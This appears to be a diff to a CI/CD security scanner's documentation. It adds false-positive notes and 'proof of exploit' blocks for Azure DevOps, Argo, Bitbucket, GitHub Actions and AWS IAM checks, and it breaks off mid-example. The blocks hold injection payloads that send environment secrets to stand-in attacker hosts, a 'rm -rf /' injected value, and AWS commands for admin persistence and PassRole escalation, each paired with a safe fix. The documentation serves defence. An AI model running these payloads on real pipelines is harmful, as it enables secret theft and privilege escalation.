@@ -14,17 +14,7 @@ and artifact controls covering the full pipeline trust chain.
 - **Distinct checks evidencing this standard:** 197
 - **Of those, autofixable with `--fix`:** 43
 
-## How to read severity
-
-Every check below ships at a fixed severity level. The scale is the same across providers and standards so a CRITICAL finding in one place means the same thing as a CRITICAL finding anywhere else.
-
-| Level | What it means | Examples |
-|-------|---------------|----------|
-| <span class="pg-sev pg-sev--critical">CRITICAL</span> | Active exploit primitive in the workflow as written. Treat as P0: a default scan path lands an attacker on a secret, an RCE, or production write access without further effort. | Hardcoded credential literal, branch ref pointing at a known-compromised action, signed-into-an-unverified registry. |
-| <span class="pg-sev pg-sev--high">HIGH</span> | Production-impact gap that requires modest attacker effort or a second condition to weaponize. Remediate this sprint; the secondary condition is usually already present in real pipelines. | Action pinned to a floating tag, sensitive permissions on a low-popularity action, mutable container tag in prod. |
-| <span class="pg-sev pg-sev--medium">MEDIUM</span> | Significant defense-in-depth gap. Not directly exploitable on its own but disables a control whose absence widens the blast radius of a separate compromise. Backlog with a deadline. | Missing branch protection, container without resource limits, freshly-published dependency consumed before the cooldown window. |
-| <span class="pg-sev pg-sev--low">LOW</span> | Hygiene / hardening issue. Not a vulnerability on its own but raises baseline posture and reduces audit friction. | Missing CI logging retention, SBOM without supplier attribution, ECR repo without scan-on-push. |
-| <span class="pg-sev pg-sev--info">INFO</span> | Degraded-mode signal. The scanner couldn't reach an API or parse a config and surfaces the gap so the operator knows coverage was incomplete. No finding against the workload itself. | ``CB-000`` CodeBuild API access failed, ``IAM-000`` IAM enumeration failed. |
+_Severity levels (`CRITICAL` / `HIGH` / `MEDIUM` / `LOW` / `INFO`) follow the same scale across every provider and standard. See [How to read severity](README.md#how-to-read-severity) on the standards overview for the definitions._
 
 ## Coverage by control
 
@@ -538,6 +528,41 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Recommendation.** Pass these values through an intermediate pipeline variable declared with `readonly: true`, and reference that variable through an environment variable rather than `$(...)` macro interpolation. ADO expands `$(…)` before shell quoting, so inline use is never safe.
 
+**Proof of exploit.**
+
+# Vulnerable: PR title macro interpolated straight into script.
+trigger: none
+pr:
+  branches:
+    include: [main]
+jobs:
+  - job: triage
+    pool: { vmImage: ubuntu-latest }
+    steps:
+      - script: |
+          echo "New PR: $(System.PullRequest.SourceBranch)"
+          echo "Subject: $(Build.SourceVersionMessage)"
+
+# Attack: open a PR from a branch whose name carries shell:
+#
+#   git checkout -b 'foo";curl https://attacker/exfil \
+#     -d "$(printenv | base64)";echo "x'
+#
+# ADO expands ``$(...)`` BEFORE shell quoting, so the macro
+# value's `"` closes the echo and the rest becomes shell.
+# The PR-validated pipeline has the same service-connection
+# credentials a main-branch build would have, so the curl
+# exfils every secret in scope. Classic pwn-request shape.
+
+# Safe: route through env so the value is never interpolated
+# into the shell template.
+      - bash: |
+          echo "New PR: $PR_BRANCH"
+          echo "Subject: $COMMIT_MSG"
+        env:
+          PR_BRANCH: $(System.PullRequest.SourceBranch)
+          COMMIT_MSG: $(Build.SourceVersionMessage)
+
 **Source:** [`ADO-002`](../providers/azure.md#ado-002) in the [Azure DevOps provider](../providers/azure.md).
 
 #### `ADO-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-003 }
@@ -557,6 +582,10 @@ Every check that evidences this standard, rendered once with its detection mecha
 **How this is detected.** Without an `environment:` binding, ADO cannot enforce approvals, checks, or deployment history against a named resource. Every `deployment:` job should bind one.
 
 **Recommendation.** Add `environment: <name>` to every `deployment:` job. Configure approvals, required branches, and business-hours checks on the matching Environment in the ADO UI.
+
+**Known false positives.**
+
+- The deploy-name regex (``deploy`` / ``release`` / ``publish`` / ``promote``) flags jobs whose names include those tokens for non-deploy reasons (e.g. ``release-notes-build`` that only generates a changelog). The deploy-command regex similarly fires on test pipelines that exercise ``kubectl apply --dry-run`` or ``helm template`` for validation. Suppress those jobs per-resource via ``--ignore-file`` once you've verified they don't actually mutate any environment.
 
 **Source:** [`ADO-004`](../providers/azure.md#ado-004) in the [Azure DevOps provider](../providers/azure.md).
 
@@ -637,6 +666,54 @@ Every check that evidences this standard, rendered once with its detection mecha
 **How this is detected.** Fires on any ``{{inputs.parameters.X}}``, ``{{workflow.parameters.X}}``, or ``{{item.X}}`` token inside a ``script.source`` body or a ``container.args`` string that isn't already wrapped in quotes. Doesn't fire on the env-var indirection pattern, which is safe.
 
 **Recommendation.** Don't interpolate ``{{inputs.parameters.<name>}}`` directly into ``script.source`` or ``container.args``. Argo substitutes the value before the shell parses it, so a parameter containing ``; rm -rf /`` runs as shell. Pass the parameter via ``env:`` (``value: '{{inputs.parameters.<name>}}'``) and reference the env var quoted in the script (``"$NAME"``); or use ``inputs.artifacts`` for file payloads.
+
+**Known false positives.**
+
+- Parameters whose values are always controlled by trusted templates (a fixed enum, an internal SHA, an upstream service identifier the workflow generates itself) are safe to interpolate unquoted but the rule has no way to see the producer. Suppress per-template with ``--ignore-file`` once you've verified the parameter source can't reach a user. Quoted forms (``"{{inputs.parameters.X}}"``) are already excluded by the negative-lookbehind, so the typical safe pattern doesn't false-positive.
+
+**Proof of exploit.**
+
+# Vulnerable: webhook-triggered workflow interpolates a
+# user-supplied parameter directly into a shell script.
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+metadata: { generateName: greet- }
+spec:
+  entrypoint: main
+  arguments:
+    parameters:
+      - name: who
+  templates:
+    - name: main
+      inputs: { parameters: [ { name: who } ] }
+      script:
+        image: alpine:3.20
+        command: [sh]
+        source: |
+          echo Hello {{inputs.parameters.who}}
+
+# Attack: a webhook caller (or anyone with Submit on the
+# WorkflowTemplate) supplies a parameter carrying shell:
+#
+#   argo submit greet.yml -p who='x;wget -qO- attacker/exfil \
+#     -d "$(env|base64)";:'
+#
+# Argo substitutes the parameter BEFORE handing the source
+# to ``sh``, so the `;` ends the echo and the next command
+# runs. The pod inherits the workflow's ServiceAccount; if
+# that SA has any cluster privilege (mount, image-pull, kubectl)
+# the attacker now has it.
+
+# Safe: route through env so the shell only sees a quoted
+# expansion of a controlled-name variable.
+      script:
+        image: alpine:3.20
+        command: [sh]
+        env:
+          - name: WHO
+            value: '{{inputs.parameters.who}}'
+        source: |
+          echo "Hello $WHO"
 
 **Source:** [`ARGO-005`](../providers/argo.md#argo-005) in the [Argo Workflows provider](../providers/argo.md).
 
@@ -734,6 +811,46 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Recommendation.** Always double-quote interpolations of ref-derived variables (`"$BITBUCKET_BRANCH"`). Avoid passing them to `eval`, `sh -c`, or unquoted command arguments.
 
+**Known false positives.**
+
+- Pipelines that *parse* a ref name rather than execute it (``echo "$BITBUCKET_BRANCH" | cut -d/ -f2``) still interpolate the variable but expose no shell-execution surface for the value. The rule has no AST-level understanding of the surrounding shell context, so a well-quoted use that happens to live near an unrelated ``$(...)`` substitution can read as an offender. Suppress per-step via ``--ignore-file`` if the value is only consumed as data.
+
+**Proof of exploit.**
+
+# Vulnerable: branch name interpolated unquoted into shell.
+image: alpine:latest
+pipelines:
+  pull-requests:
+    '**':
+      - step:
+          name: triage
+          script:
+            - echo Building $BITBUCKET_BRANCH
+            - ./scripts/build.sh $BITBUCKET_BRANCH
+
+# Attack: open a PR from a branch whose name is shell:
+#
+#   git checkout -b 'foo;curl https://attacker/x \
+#     -d "$(env|base64)";:'
+#
+# Bitbucket substitutes ``$BITBUCKET_BRANCH`` literally before
+# the shell parses the line, so the `;` becomes a command
+# separator and the curl exfils the step's env (which holds
+# every repository / workspace variable in scope, including
+# deploy keys configured for the pipeline).
+
+# Safe: double-quote and pass via env so the value is only
+# consumed as data.
+      - step:
+          name: triage
+          script:
+            - echo "Building $BRANCH"
+            - ./scripts/build.sh "$BRANCH"
+          # Bitbucket has no declarative env block; assign
+          # via shell so the value is captured as a single
+          # argv element from the controlled assignment.
+          # (Equivalent: BRANCH="$BITBUCKET_BRANCH"; ...)
+
 **Source:** [`BB-002`](../providers/bitbucket.md#bb-002) in the [Bitbucket provider](../providers/bitbucket.md).
 
 #### `BB-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-bb-003 }
@@ -808,6 +925,10 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Known false positives.**
+
+- Names that imply a secret but actually store a non-sensitive identifier flag here: ``CACHE_KEY: build-2024-Q4``, ``API_KEY_PATH: /var/run/secrets/api``, ``SECRET_NAME: my-vault-secret``. The rule has no way to tell from the name + literal alone whether the value is the credential or merely a reference to one. Also: deliberate test fixtures and documentation snippets that embed canonical example values (``AKIAIOSFODNN7EXAMPLE``) match the strong-pattern set; this is intentional, real-world copies of those example literals usually mean a docs paste was never substituted.
+
 **Source:** [`BK-002`](../providers/buildkite.md#bk-002) in the [Buildkite provider](../providers/buildkite.md).
 
 #### `BK-003`: Untrusted Buildkite variable interpolated in command <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-003 }
@@ -817,6 +938,10 @@ Every check that evidences this standard, rendered once with its detection mecha
 **How this is detected.** Buildkite passes branch / tag / message metadata as environment variables. Putting them inside ``$(...)`` or shelling out with the value unquoted is a classic command-injection vector. The detection fires on the unquoted interpolation form and on use inside ``eval`` / ``$(...)``.
 
 **Recommendation.** Don't interpolate ``$BUILDKITE_BRANCH``, ``$BUILDKITE_TAG``, ``$BUILDKITE_MESSAGE``, ``$BUILDKITE_PULL_REQUEST_*``, or ``$BUILDKITE_BUILD_AUTHOR*`` directly into shell commands. These come from the pull request / branch and are attacker-controllable. Quote them and assign to a local variable first (``branch="$BUILDKITE_BRANCH"; ./script --branch "$branch"``), or pass them as arguments to a script you own.
+
+**Known false positives.**
+
+- The single-token double-quoted form (``"$BUILDKITE_BRANCH"``) is already excluded; multi-token shell snippets that *look* unquoted but are consumed safely by the downstream tool (e.g. a ``./script.sh $BUILDKITE_BRANCH`` where the script treats argv as data and never re-evaluates) still flag. The rule has no AST-level understanding of the called script, suppress per-step via ``--ignore-file`` once you've verified the script handles untrusted argv safely (or quote the use, which is the better fix).
 
 **Source:** [`BK-003`](../providers/buildkite.md#bk-003) in the [Buildkite provider](../providers/buildkite.md).
 
@@ -888,7 +1013,7 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked).
 
-**How this is detected.** Unsigned artifacts can't be verified downstream, a tampered build is indistinguishable from a legitimate one. The check recognises cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools, matching the shared signing-token catalog used by the other CI packs.
+**How this is detected.** Unsigned artifacts can't be verified downstream, a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools, matching the shared signing-token catalog used by the other CI packs.
 
 **Recommendation.** Add a signing step, install cosign once (``brew install cosign`` in the agent image, or a ``cosign-install`` plugin) and call ``cosign sign --yes <ref>`` after the build. For container images pushed to ECR / GCR / GHCR, the same call signs by digest. Publish the signature alongside the artifact and verify it at consumption time.
 
@@ -931,6 +1056,44 @@ Every check that evidences this standard, rendered once with its detection mecha
 **How this is detected.** Flags a plaintext env var when either (a) its **name** matches a secret-like pattern (PASSWORD, TOKEN, API_KEY, ...) or (b) its **value** matches a known credential shape (AKIA/ASIA access keys, GitHub tokens, Slack xox* tokens, JWTs). Plaintext values are visible in the AWS console, CloudTrail, and build logs to anyone with read access.
 
 **Recommendation.** Move secrets to AWS Secrets Manager or SSM Parameter Store and reference them using type SECRETS_MANAGER or PARAMETER_STORE in the CodeBuild environment variable configuration.
+
+**Proof of exploit.**
+
+# Vulnerable: CodeBuild project with a plaintext PAT in env.
+{
+  "name": "deploy",
+  "environment": {
+    "environmentVariables": [
+      {"name": "GITHUB_TOKEN",
+       "value": "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+       "type": "PLAINTEXT"}
+    ]
+  }
+}
+
+# Exposure surface (no exploit needed, the value just leaks):
+#  - codebuild:BatchGetProjects returns the value to anyone with
+#    that permission (often broader than `codebuild:StartBuild`).
+#  - CloudTrail's UpdateProject / CreateProject events record
+#    the full env block in audit logs.
+#  - The buildspec can ``echo $GITHUB_TOKEN`` and the value
+#    lands in the build log group, readable by anyone with
+#    logs:GetLogEvents on the group.
+#  - The AWS console shows the value to anyone with project
+#    read access; no separate decrypt permission gates it.
+
+# Safe: reference Secrets Manager / SSM, never store the
+# plaintext on the project.
+{
+  "name": "deploy",
+  "environment": {
+    "environmentVariables": [
+      {"name": "GITHUB_TOKEN",
+       "value": "arn:aws:secretsmanager:us-east-1:111111111111:secret:gh-pat-AbCdEf",
+       "type": "SECRETS_MANAGER"}
+    ]
+  }
+}
 
 **Source:** [`CB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -1056,7 +1219,7 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked).
 
-**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognises cosign, sigstore, slsa-framework, and notation-sign as signing tools.
+**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-framework, and notation-sign as signing tools.
 
 **Recommendation.** Add a signing step to the pipeline, e.g. install cosign and run `cosign sign`, or use the `sigstore` CLI. Publish the signature alongside the artifact and verify it at consumption time.
 
@@ -1066,7 +1229,7 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.
 
-**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognises CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.
+**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.
 
 **Recommendation.** Add an SBOM generation step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the build artifacts so consumers can ingest it into their vulnerability management pipeline.
 
@@ -1214,7 +1377,7 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.
 
-**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognises trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.
+**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.
 
 **Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.
 
@@ -1408,6 +1571,10 @@ CMD ["python3", "/app/app.py"]
 
 **Recommendation.** Replace ``ADD https://...`` with a multi-step ``RUN``: download the file with ``curl -fsSLo``, verify a known-good checksum (``sha256sum -c``) or signature (``cosign verify-blob``), then extract / install. Better still: download the artifact in a builder stage and ``COPY`` it across. That way the verifier runs once at build time, not per-pull.
 
+**Known false positives.**
+
+- ``ADD`` of an internal URL served from an immutable, build-time-frozen object store (a private artifact registry under your control, GCS with object-versioning and uniform bucket-level access) is materially less risky than a public-internet fetch, but the rule still fires because no on-line check can distinguish trusted from untrusted hosts. Prefer the explicit ``--checksum=sha256:<hex>`` form (BuildKit native, doesn't trigger) or move to a ``COPY`` from a builder stage; suppress per-Dockerfile if the deployment target guarantees the URL host can't be substituted.
+
 **Source:** [`DF-003`](../providers/dockerfile.md#df-003) in the [Dockerfile provider](../providers/dockerfile.md).
 
 #### `DF-004`: RUN executes a remote script via curl-pipe / wget-pipe <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-004 }
@@ -1546,7 +1713,7 @@ CMD ["python3", "/app/app.py"]
 
 **Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.
 
-**How this is detected.** Recognises ``chown`` and ``chgrp`` invocations whose first non-flag path argument resolves under a system directory. The non-recursive case is also flagged because a single ``chown user /etc`` is just as harmful, the recursive flag matters for the size of the blast radius, not for whether it's wrong. Application paths under ``/opt``, ``/srv``, ``/var/lib/<app>``, and ``/app`` are not flagged.
+**How this is detected.** Recognizes ``chown`` and ``chgrp`` invocations whose first non-flag path argument resolves under a system directory. The non-recursive case is also flagged because a single ``chown user /etc`` is just as harmful, the recursive flag matters for the size of the blast radius, not for whether it's wrong. Application paths under ``/opt``, ``/srv``, ``/var/lib/<app>``, and ``/app`` are not flagged.
 
 **Recommendation.** Don't ``chown`` system directories at build time. If the runtime user needs to own a workload-specific subtree, ``COPY --chown=<user>:<group>`` it into the image at the subtree root, or place the workload under a dedicated directory (e.g. ``/app``, ``/srv/app``) and ``chown`` only that path. Granting the runtime user write access to ``/etc``, ``/usr``, ``/sbin``, or ``/lib`` lets a process exploit later steps to stage a binary the system trusts.
 
@@ -1664,6 +1831,10 @@ CMD ["python3", "/app/app.py"]
 
 **Recommendation.** Map the secret under ``availableSecrets.secretManager[]`` with an ``env:`` alias, then reference it from each step via ``secretEnv: [ALIAS]``. Avoid inline ``gcloud secrets versions access`` in ``args``, the resolved plaintext lands in build logs.
 
+**Known false positives.**
+
+- Steps whose sole purpose is to *grant* a service account access to a secret (``gcloud secrets add-iam-policy-binding``) reference the resource URI without exposing the value. The literal-URI regex doesn't distinguish read from administrative operations. Suppress those specific steps via ``--ignore-file`` once you've confirmed the gcloud subcommand is administrative.
+
 **Source:** [`GCB-003`](../providers/cloudbuild.md#gcb-003) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 #### `GCB-004`: dynamicSubstitutions on with user substitutions in step args <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-004 }
@@ -1673,6 +1844,10 @@ CMD ["python3", "/app/app.py"]
 **How this is detected.** The ``_``-prefix is Cloud Build's naming convention for user substitutions; they are editable via build trigger UI, ``gcloud builds submit --substitutions``, and the REST API. Built-in substitutions (``$PROJECT_ID``, ``$COMMIT_SHA``, ``$BUILD_ID``) are derived from the trigger event and are *not* treated as user-controlled by this rule.
 
 **Recommendation.** Either disable ``options.dynamicSubstitutions`` (it defaults to false) or move user substitutions (``$_FOO``) out of step ``args``, pass them through ``env:`` and reference them inside a shell script the builder runs. Dynamic substitution re-evaluates bash syntax after variable expansion, giving trigger-config editors a script-injection channel.
+
+**Known false positives.**
+
+- Pipelines that enable ``dynamicSubstitutions`` solely to use bash parameter expansion on *built-in* substitutions (``${PROJECT_ID/-/_}``) still flag if any step also references a ``$_USER_VAR``, even when the user sub lands in a context that can't reach a shell. The rule has no AST-level awareness of which substitution is consumed by which shell context. Suppress per-step via ``--ignore-file`` after verifying the user sub never feeds bash re-evaluation.
 
 **Source:** [`GCB-004`](../providers/cloudbuild.md#gcb-004) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -1840,6 +2015,10 @@ CMD ["python3", "/app/app.py"]
 
 **Recommendation.** Pass user substitutions through ``env:`` (or ``secretEnv:`` for sensitive values) and reference them inside a checked-in shell script rather than splicing them directly into ``args``. If the step truly needs to invoke shell logic inline, switch the entrypoint to the underlying tool (``docker``, ``gcloud``, ``gsutil``) and let the tool see the substitution as an argument, not as shell text.
 
+**Known false positives.**
+
+- Substitutions whose values are *server-controlled* in practice (e.g. the trigger always supplies a SHA from ``$_HEAD_COMMIT_SHA`` aliased into a ``$_BUILD_TAG`` by the trigger config) still match the user-sub regex because Cloud Build can't distinguish locked from editable trigger fields. Suppress per-step via ``--ignore-file`` once you've verified your trigger policy prevents arbitrary substitution overrides, ideally combined with ``options.substitutionOption: MUST_MATCH`` (GCB-022) to make the lock explicit.
+
 **Source:** [`GCB-019`](../providers/cloudbuild.md#gcb-019) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 #### `GCB-020`: serviceAccount points at the default Cloud Build service account <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-020 }
@@ -1895,6 +2074,10 @@ CMD ["python3", "/app/app.py"]
 **How this is detected.** Walks every step's ``args:`` / ``entrypoint:`` / ``env:`` / ``dir:`` / ``id:`` / ``waitFor:`` for ``$_NAME`` tokens (Cloud Build's user-substitution syntax is leading underscore + uppercase / digits / underscore) and cross-references against the top-level ``substitutions:`` mapping. Built-in substitutions (``$PROJECT_ID``, ``$REPO_NAME``, ``$BRANCH_NAME``, ``$TAG_NAME``, ``$COMMIT_SHA``, ``$SHORT_SHA``, ``$REVISION_ID``, ``$BUILD_ID``, ``$LOCATION``, ``$TRIGGER_NAME``, ``$_HEAD_*``, ``$_BASE_*``, ``$_PR_NUMBER`` and the ``$_HEAD_REPO_URL`` family) are Cloud Build server-set and don't appear in ``substitutions:``; the rule allow-lists them so they don't false-positive.
 
 **Recommendation.** Add an entry for every ``$_USER_VAR`` referenced anywhere in the build to the top-level ``substitutions:`` block, either with a sensible default or with an empty string if the trigger always supplies the value. Cloud Build's default ``options.substitutionOption: MUST_MATCH`` then fails the build at parse time on undeclared references (catching typos at the gate). With the looser ``ALLOW_LOOSE`` opt-in (GCB-022) undeclared references silently expand to the empty string, which masks the bug and quietly broadens any shell command that interpolates the value.
+
+**Known false positives.**
+
+- Cloud Build deployments triggered exclusively via ``gcloud builds submit --substitutions=_FOO=bar`` (without a build trigger) may legitimately reference ``$_FOO`` without declaring it under ``substitutions:`` because the value is always supplied from the CLI. The scanner can't observe trigger / CLI configuration, only the YAML. Declaring the variable with an empty-string default is the canonical fix; ``--ignore-file`` is the escape hatch when that's not practical.
 
 **Source:** [`GCB-023`](../providers/cloudbuild.md#gcb-023) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -1983,7 +2166,7 @@ CMD ["python3", "/app/app.py"]
 **Seen in the wild.**
 
 - GitHub Security Lab: [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) (2020), the canonical write-up. Demonstrates how a fork PR that lands in a ``pull_request_target`` workflow with the PR head checked out runs in the base repo's privileged context.
-- Trail of Bits ``Codecov-style supply chain via pwn requests`` (2021): showed the primitive against widely-used Actions workflows. The fix pattern (split the workflow into a privileged labeler + an unprivileged builder) is now standard guidance.
+- [Keeping your GitHub Actions and workflows secure: Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/) (GitHub Security Lab, 2020): catalogued real-world Actions carrying the same primitive. The fix pattern (split the workflow into a privileged labeler + an unprivileged builder) is now standard guidance.
 
 **Proof of exploit.**
 
@@ -2053,7 +2236,7 @@ jobs:
 **Seen in the wild.**
 
 - [GitHub Security Lab disclosure](https://securitylab.github.com/research/github-actions-untrusted-input/) (2020): a sweep of public Actions found dozens of widely-used workflows interpolating ``github.event.issue.title`` / ``pull_request.title`` directly into shell. Any commenter or PR author could run arbitrary commands in the maintainer's CI.
-- Trail of Bits ``pwn-request`` research (2021): demonstrated the same primitive against ``pull_request_target`` workflows where the runner has secrets and a write-scope token; one fork PR could exfiltrate every secret the workflow could see. Mitigation is the same: never interpolate context into shell, route through ``env:``.
+- [Keeping your GitHub Actions and workflows secure: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) (GitHub Security Lab, 2020): the same primitive against ``pull_request_target`` workflows where the runner has secrets and a write-scope token; one fork PR exfiltrates every secret the workflow can see. Mitigation: never interpolate context into shell, route through ``env:``.
 
 **Proof of exploit.**
 
@@ -2140,7 +2323,7 @@ jobs:
 
 **Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.
 
-**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognises CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.
+**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.
 
 **Recommendation.** Add an SBOM generation step, `anchore/sbom-action`, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the release so consumers can ingest it into their vuln-management pipeline.
 
@@ -2166,24 +2349,27 @@ jobs:
 **Proof of exploit.**
 
 # Vulnerable: pinned to a SHA the attacker landed under @v45.
-- uses: tj-actions/changed-files@0e58ed867288cdc3d92e6e2f9bb9b1bd0c4c78d2
+# (Substitute the actual malicious-commit SHA from the CVE-2025-30066
+# advisory; the registry in _compromised_actions.py carries it.)
+- uses: tj-actions/changed-files@<advisory-malicious-sha>
 
 # Same applies to tag pins that resolved to the malicious
 # commit during the compromise window:
 - uses: tj-actions/changed-files@v45     # WAS pointing at the bad commit
 
-# Attack: the action body exfiltrated CI secrets to a
-# Memdump-style endpoint:
+# Attack: the injected action body exfiltrated CI secrets by
+# dumping the runner process environment to a controlled host:
 #   curl -X POST https://attacker.example/exfil \
 #     -d "$(cat /proc/self/environ)"
 #
 # Every workflow run that hit one of those refs over the
-# ~24-hour exposure window leaked the entire env block,
-# including ${{ secrets.* }} and GITHUB_TOKEN.
+# compromise window leaked the entire env block, including
+# ${{ secrets.* }} and GITHUB_TOKEN.
 
 # Safe: pin to the post-incident clean SHA the maintainer
-# published in the advisory:
-- uses: tj-actions/changed-files@a284dc1814e3fdd1a3a7f16c11f02e2cd5a98f93  # v45.0.0 (clean)
+# republished in the advisory (consult the GHSA the registry
+# cites for the exact value):
+- uses: tj-actions/changed-files@<advisory-clean-sha>
 
 **Source:** [`GHA-040`](../providers/github.md#gha-040) in the [GitHub Actions provider](../providers/github.md).
 
@@ -2255,7 +2441,7 @@ jobs:
 
 **Seen in the wild.**
 
-- Multiple action-tag compromises (ua-parser-js npm 2021, tj-actions/changed-files 2024) followed the same shape: a tag was re-pointed at a malicious commit and consumers pulling on the next CI run executed the payload. Cooldown gating turns the community-detection window into a defense.
+- Multiple action-tag compromises (ua-parser-js npm 2021, tj-actions/changed-files 2025) followed the same shape: a tag was re-pointed at a malicious commit and consumers pulling on the next CI run executed the payload. Cooldown gating turns the community-detection window into a defense.
 
 **Source:** [`GHA-047`](../providers/github.md#gha-047) in the [GitHub Actions provider](../providers/github.md).
 
@@ -2472,6 +2658,41 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 
 **Recommendation.** Replace AdministratorAccess with least-privilege policies.
 
+**Proof of exploit.**
+
+# Vulnerable: CodeBuild service role with AdministratorAccess.
+# (Terraform shown for clarity; the actual finding comes from
+# live ListAttachedRolePolicies on the role.)
+resource "aws_iam_role" "codebuild" {
+  name               = "codebuild-deploy"
+  assume_role_policy = data.aws_iam_policy_document.cb_trust.json
+}
+resource "aws_iam_role_policy_attachment" "admin" {
+  role       = aws_iam_role.codebuild.name
+  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
+}
+
+# Attack: any compromise of the build (poisoned dependency,
+# leaked buildspec edit, malicious PR merged to the branch
+# CodeBuild trusts) runs as a principal with full account
+# permissions. From a build shell:
+#
+#   aws iam create-user --user-name persistence
+#   aws iam attach-user-policy --user-name persistence \
+#     --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+#   aws iam create-access-key --user-name persistence
+#
+# Game over: out-of-band admin, no IP gate, survives every
+# subsequent rotation of the CodeBuild role itself.
+
+# Safe: scope the role to the resources the pipeline actually
+# touches. ``AdministratorAccess`` is never the right answer
+# for an automation principal.
+resource "aws_iam_role_policy" "codebuild_least_priv" {
+  role   = aws_iam_role.codebuild.id
+  policy = data.aws_iam_policy_document.deploy_specific.json
+}
+
 **Source:** [`IAM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 #### `IAM-002`: CI/CD role has wildcard Action in attached policy <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-002 }
@@ -2501,6 +2722,43 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 **How this is detected.** ``iam:PassRole`` with ``Resource: '*'`` lets the principal hand any role to any service. Combined with a service that runs your code (Lambda, ECS, CodeBuild, EC2 Instance Profiles), this is role-hop privilege escalation: launch an ephemeral resource configured with a higher-privileged role, run code under that identity, exfil. Scoping by ARN + ``iam:PassedToService`` removes the escalation path.
 
 **Recommendation.** Restrict iam:PassRole to specific role ARNs and add an iam:PassedToService condition.
+
+**Proof of exploit.**
+
+# Vulnerable: pipeline role grants PassRole with Resource: '*'.
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Action": ["iam:PassRole", "lambda:CreateFunction",
+                "lambda:InvokeFunction"],
+    "Resource": "*"
+  }]
+}
+
+# Attack: from a build shell, create a Lambda configured with
+# the highest-privileged role you can name and invoke it:
+#
+#   aws lambda create-function --function-name pwn \
+#     --role arn:aws:iam::123456789012:role/prod-admin \
+#     --runtime python3.12 --handler i.h \
+#     --zip-file fileb://payload.zip
+#   aws lambda invoke --function-name pwn /tmp/out
+#
